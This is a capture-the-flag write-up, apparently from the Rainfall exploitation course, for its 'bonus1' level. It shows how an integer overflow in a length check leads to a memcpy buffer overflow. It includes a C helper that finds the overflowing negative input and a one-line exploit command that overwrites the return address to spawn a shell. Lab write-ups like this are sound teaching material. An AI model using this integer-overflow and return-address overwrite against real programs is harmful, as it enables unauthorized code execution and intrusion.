# Bonus1

Let's see to the binary

![](/Users/a19523132/school/Rainfall/bonus1/Ressources/img/bonus1_launch.png)

Seem, this program waits two numbers lower than 10 as input and prints them. Let's use [gdb](Ressources/gdb.md) to understand what's going on. 

We need to exploit the overflow property of `atoi` to give us more bytes to copy with `memcpy`. 
As seen in the analysis, the buffer has an offset of `56` bytes, but we need to pass the check which need our input to be less than `10`. 

In order to do this, we need to find a negative number that by underflow gives back a large enough positive number.

    #include <cstdio>
    
    int main()
    {
        int input = 0;
    
        for (int result = 0; result <= 0 || result > 64; --input)
        {
            result = input * 4;
        }
    
        printf("input = %d\n", input);
    }

This program outputs us a potential input which is `-1073741809` which gives us `60` after the multiplication and underflow (`56` offset bytes + `4` bytes for a potential address)

Now, all we have to do is to find an address `0x08048482` to re-route the program to spawn a shell since there is a built-in way to do so

`./bonus1 -1073741809 $(python -c "print '\x90' * 56 + '\x08\x04\x84\x82'[::-1]")`

![](/Users/a19523132/school/Rainfall/bonus1/Ressources/img/bonus2.png)
